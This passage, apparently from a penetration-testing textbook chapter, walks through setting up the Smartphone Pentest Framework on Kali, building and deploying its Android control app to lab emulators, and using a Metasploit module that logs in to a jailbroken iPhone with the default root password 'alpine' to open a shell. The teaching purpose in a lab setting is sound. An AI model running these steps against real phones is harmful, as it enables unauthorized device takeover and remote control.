loads, make sure that the Apache server is running, as shown here.
root@kali:~/Smartphone-Pentest-Framework/frameworkconsole# service apache2 start
Additionally, SPF records information in either a MySQL or PostgreSQL
database. Make sure the MySQL database is started, as shown here.
root@kali:~/Smartphone-Pentest-Framework/frameworkconsole# service mysql start
The last thing to do is edit our SPF configuration file, /root/Smartphone
-Pentest-Framework/frameworkconsole/config, to match our environment. The
default configuration file is shown in Listing 20-1.
root@kali:~/Smartphone-Pentest-Framework/frameworkconsole# cat config
#SMARTPHONE PENTEST FRAMEWORK CONFIG FILE
#ROOT DIRECTORY FOR THE WEBSERVER THAT WILL HOST OUR FILES
WEBSERVER = /var/www
#IPADDRESS FOR WEBSERVER (webserver needs to be listening on this address)
IPADDRESS = 192.168.20.9 u
Using the Smartphone Pentest Framework 447
#IP ADDRESS TO LISTEN ON FOR SHELLS
SHELLIPADDRESS = 192.168.20.9 v
#IP ADDRESS OF SQLSERVER 127.0.0.1 IF LOCALHOST
MYSQLSERVER = 127.0.0.1
--snip--
#NMAP FOR ANDROID LOCATION
ANDROIDNMAPLOC = /root/Smartphone-Pentest-Framework/nmap-5.61TEST4
#EXPLOITS LOCATION
EXPLOITSLOC = /root/Smartphone-Pentest-Framework/exploits
Listing 20-1: SPF config file
The default should meet your needs if your Kali IP address is 192.168.20.9
and you installed SPF in /root/Smartphone-Pentest-Framework/. Otherwise, change
the IPADDRESS u and SHELLIPADDRESS v to your Kali machine’s IP address.
Now run SPF by changing the directory to /root/Smartphone-Pentest
-Framework/frameworkconsole/ and running ./framework.py. You should be
presented with a menu similar to Listing 20-2.
root@kali:~/Smartphone-Pentest-Framework/frameworkconsole# ./framework.py
################################################
# #
# Welcome to the Smartphone Pentest Framework! #
# v0.2.6 #
# Georgia Weidman/Bulb Security #
# #
################################################
Select An Option from the Menu:
1.) Attach Framework to a Deployed Agent/Create Agent
2.) Send Commands to an Agent
3.) View Information Gathered
4.) Attach Framework to a Mobile Modem
5.) Run a remote attack
6.) Run a social engineering or client side attack
7.) Clear/Create Database
8.) Use Metasploit
9.) Compile code to run on mobile devices
10.) Install Stuff
11.) Use Drozer
0.) Exit
spf>
Listing 20-2: Starting SPF
We will spend the rest of the chapter exploring SPF’s various options.
For now, let’s run a quick test to make sure that SPF can communicate with
the database. The SPF installer set up an empty database for SPF, but you
448 Chapter 20
can clear out all your data and start fresh by running option 7.) Clear/Create
Database, as shown here. This command will clear the SPF database tables
and create them if they do not already exist.
spf> 7
This will destroy all your data. Are you sure you want to? (y/N)? y
Android Emulators
In Chapter 1, we created three Android emulators. Though some of our
attacks will work regardless of the Android version, we’ll look at certain
client-side and privilege-escalation attacks that work well on emulators
that target these specific older versions. Because they’re only emulators, you
won’t be able to successfully test all known Android exploits against your
Android emulators.
Attaching a Mobile Modem
Because not all mobile attack vectors use the TCP/IP network, SPF piggy-
backs on the pentester’s devices. As of this writing, SPF can use the mobile
modem of an Android phone with the SPF app installed or USB modem
with a SIM card to send SMS messages. Additionally, when using an Android
phone with NFC capability, SPF can deliver payloads via Android Beam and
the SPF Android App.
Building the Android App
To build the Android app from SPF, choose option 4.) Attach Framework to a
Mobile Modem, as shown in Listing 20-3.
spf> 4
Choose a type of modem to attach to:
1.) Search for attached modem
2.) Attach to a smartphone based app
3.) Generate smartphone based app
4.) Copy App to Webserver
5.) Install App via ADB
spf> 3u
Choose a type of control app to generate:
1.) Android App (Android 1.6)
2.) Android App with NFC (Android 4.0 and NFC enabled device)
spf> 1v
Phone number of agent: 15555215556w
Control key for the agent: KEYKEY1x
Webserver control path for agent: /androidagent1y
Using the Smartphone Pentest Framework 449
Control Number:15555215556
Control Key:KEYKEY1
ControlPath:/bookspf
Is this correct?(y/n)y
--snip--
-post-build:
debug:
BUILD SUCCESSFUL
Total time: 10 seconds
Listing 20-3: Building the SPF app
Next select option 3.) Generate smartphone based app u. SPF can make two
kinds of apps: one that uses NFC, and one that does not. Because our Android
emulator lacks NFC capabilities, choose 1.) Android App (Android 1.6) v.
You’ll be asked to enter information about an SPF agent to control
via the SPF app. SPF agents allow us to control an infected mobile device.
We’ll look at generating and deploying SPF agents later in the chapter; for
now, just enter the phone number of your Android 2.2 emulator w, a seven-
character key x, and a path on the web server starting with / y. SPF will
then use the Android SDK to build the SPF app.
Deploying the App
Now to deploy the app on our Android 4.3 emulator. This emulator will
simulate the pentester-controlled device, and the other two emulators will
be our targets. If you’re running your emulators on Kali Linux or using real
Android devices that you can attach via USB to your Kali virtual machine,
you can use Android Debug Bridge (ADB) to install the app, as shown in
Listing 20-4. (First, choose option 4.) Attach Framework to a Mobile Modem
from the main menu.)
spf> 4
Choose a type of modem to attach to:
1.) Search for attached modem
2.) Attach to a smartphone based app
3.) Generate smartphone based app
4.) Copy App to Webserver
5.) Install App via ADB
spf> 5
* daemon not running. starting it now on port 5037 *
* daemon started successfully *
List of devices attached
emulator-5554 device
emulator-5556 device
emulator-5558 device
450 Chapter 20
Choose a device to install on: emulator-5554u
Which App?
1.)Framework Android App with NFC
2.)Framework Android App without NFC
spf> 2v
1463 KB/s (46775 bytes in 0.031s)
pkg: /data/local/tmp/FrameworkAndroidApp.apk
Success
Listing 20-4: Installing the SPF app
From the Choose a type of modem to attach to menu, select option 5
to have ADB search for all attached devices. Next, tell SPF which emulator
or device to install SPF on; in this example I’ve chosen emulator-5554 u, the
Android 4.3 emulator with phone number 1-555-521-5554. Finally, tell SPF
to install the Android app without NFC (option 2) v.
If you’re using emulators on your host system, ADB from Kali will not be
able to attach to them. Instead, to deploy the app, choose option 4.) Attach
Framework to a Mobile Modem from the main menu and then choose option
4.) Copy App to Webserver, as shown in Listing 20-5.
spf> 4
Choose a type of modem to attach to:
1.) Search for attached modem
2.) Attach to a smartphone based app
3.) Generate smartphone based app
4.) Copy App to Webserver
5.) Install App via ADB
spf> 4
Which App?
1.)Framework Android App with NFC
2.)Framework Android App without NFC
spf> 2u
Hosting Path: /bookspf2v
Filename: /app.apkw
Listing 20-5: Copy app to web server
This will allow us to copy the app to Kali’s web server, where we can
download and install it to the emulator. Tell SPF to copy the Framework
Android App without NFC u, and then tell it where to put the app on the
web server v. Finally, tell SPF the filename for the app to be downloaded w.
Download the app from your Android 4.3 emulator by opening the URL
http://192.168.20.9/bookspf2/app.apk in the mobile browser.
Using the Smartphone Pentest Framework 451
Attaching the SPF Server and App
Now we need to attach the SPF server and the SPF app, as shown in
Listing 20-6. (Again, begin with option 4 in the main menu.)
spf> 4
Choose a type of modem to attach to:
1.) Search for attached modem
2.) Attach to a smartphone based app
3.) Generate smartphone based app
4.) Copy App to Webserver
5.) Install App via ADB
spf> 2u
Connect to a smartphone management app. You will need to supply the phone
number, the control key, and the URL path.
Phone Number: 15555215554v
Control Key: KEYKEY1w
App URL Path: /bookappx
Phone Number: 15555215554
Control Key: KEYKEY1
URL Path: /bookapp
Is this correct?(y/N): y
Listing 20-6: Attaching to SPF app
Choose 2.) Attach to a smartphone
based app u. Next, give SPF the phone
number of the emulator running the SPF
app v, a seven-character key w, and the
URL where the app will check in x. (The
key does not need to be the same one we
used for the agent when building the app.
Also the URL should be different from the
one used for the agent when building the
app.) Once you’ve confirmed that this
information is correct, SPF will appear to
hang. We need to attach the app.
To attach the app, first open it on the
Android emulator. The main screen asks
for the IP address of the SPF server, the
URL to check in, and the seven-character
key. Use the same values as in the previ-
ous step (except the IP address should be
the IP address of the SPF server rather
Figure 20-1: SPF app
than the phone number), as shown in
Figure 20-1.
452 Chapter 20
After you’ve filled out the information, click Attach on the app. You
will now be able to control the phone from SPF until you click Detach. Now
return to SPF on Kali. When the app is attached, you are dropped back
to the main SPF menu, which means we’re ready to start running mobile
attacks.
remote attacks
In the history of mobile devices, there have been attacks on the mobile
modem and other externally facing interfaces. For example, researchers
found vulnerabilities in the mobile modem drivers for both Android phones
and the iPhone that allowed attackers to crash the phone, take it off the
mobile network, or even gain command execution on it, just by sending an
SMS message. Like traditional computers, as the security position of mobile
devices improves, the number of available remote attacks will decrease.
That said, the more software users install on their phones, the greater the
chance that there’s a potentially vulnerable service listening on a network
port, as you’ll learn in the following sections.
Default iPhone SSH Login
One remote attack was perhaps the cause of the first iPhone botnet. On
jailbroken iPhones, users can install SSH to log in to their iPhone termi-
nals remotely. By default, SSH has the root password alpine on all devices.
Of course, users should change this value, but many who jailbreak their
iPhones do not. Though this issue came to light years ago, as with many
default password issues, it continues to pop up.
To test for this default SSH password on a jailbroken iPhone, we could
choose 5.) Run a Remote Attack, or use our old friend, Metasploit. Much as
SET allowed us to create client-side attacks in Metasploit in Chapter 11, we
can use SPF to interface with Msfcli to automate running mobile modules
from Metasploit.
Unfortunately, as of this writing, not much in Metasploit targets mobile
devices, but one module does test for use of the default iPhone password. As
shown in Listing 20-7, from the main SPF menu choose 8.) Use Metasploit,
and then choose 1.) Run iPhone Metasploit Modules. Next, choose 1.) Cydia
Default SSH Password. SPF will ask you for the IP address of the iPhone in
order to fill in the RHOST option in the module. SPF will then call Msfcli and
run the desired module.
spf> 8
Runs smartphonecentric Metasploit modules for you.
Select An Option from the Menu:
1.) Run iPhone Metasploit Modules
2.) Create Android Meterpreter
3.) Setup Metasploit Listener
spf> 1
Using the Smartphone Pentest Framework 453
Select An Exploit:
1.) Cydia Default SSH Password
2.) Email LibTiff iOS 1
3.) MobileSafari LibTiff iOS 1
spf> 1
Logs in with alpine on a jailbroken iPhone with SSH enabled.
iPhone IP address: 192.168.20.13
[*] Initializing modules...
RHOST => 192.168.20.13
[*] 192.168.20.13:22 - Attempt to login as 'root' with password 'alpine'
[+] 192.168.20.13:22 - Login Successful with 'root:alpine'
[*] Found shell.
[*] Command shell session 1 opened (192.168.20.9:39177 -> 192.168.20.13:22) at
2015-03-21 14:02:44 -0400
ls
Documents
Library
Media
--snip--